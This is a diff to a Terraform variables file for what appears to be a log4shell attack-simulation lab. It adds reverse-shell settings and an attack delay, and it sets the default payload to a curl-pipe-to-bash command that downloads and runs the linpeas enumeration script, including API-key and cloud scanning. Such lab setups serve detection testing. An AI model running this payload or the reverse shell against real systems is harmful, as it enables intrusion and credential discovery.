@@ -23,6 +23,12 @@ variable "cron" {
   default = "cron(0/30 * * * ? *)"
 }
 
+variable "reverse_shell" {
+  type = bool
+  description = "when enabled the payload string will be used to connect to reverse shell, in the format <host>/<port>"
+  default = false
+}
+
 variable "attacker_http_port" {
   type = number
   description = "listening port for webserver in container"
@@ -54,6 +60,18 @@ variable "payload" {
   type = string
   description = "bash payload to execute"
   default = <<-EOT
-  touch /tmp/log4shell_pwned
+  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex
   EOT
+}
+
+variable "attack_delay" {
+  type = number
+  description = "wait time between baseline and attack (default: 12 hours)"
+  default =  50400
+}
+
+variable "reverse_shell_port" {
+  type = number
+  description = "port number to check for ready state - optional"
+  default = 0
 }
